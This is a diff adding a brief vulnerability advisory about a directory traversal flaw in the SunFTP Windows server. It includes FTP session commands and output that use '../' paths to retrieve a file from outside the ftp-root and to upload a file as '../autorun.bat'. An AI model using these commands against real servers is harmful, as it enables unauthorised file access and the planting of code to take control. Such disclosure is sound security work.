@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/2428/info
+
+SunFTP is a freeware ftp server written by Rasmus J.P. Allenheim and associates for the Windows platform.
+
+SunFTP contains a vulnerability that may allow ftp users to compromise the server. Users may be able to upload or retrieve files from outside the protected ftp-root directory.
+
+This could allow, for example, users to place trojan horse programs on the system and gain control. 
+
+Using this vulnerability to retrieve a file from outside the ftp-root (sunftptest.txt):
+
+ftp> get ../sunftptest.txt
+200 Port command successful.
+150 Opening data connection for ../sunftptest.txt.
+226 File sent ok
+
+Using this vulnerability to place a file on the target filesystem outside the ftp-root (../autorun.bat):
+
+ftp> put
+Lokale Datei c:\test.txt
+Remotedatei ../autorun.bat 
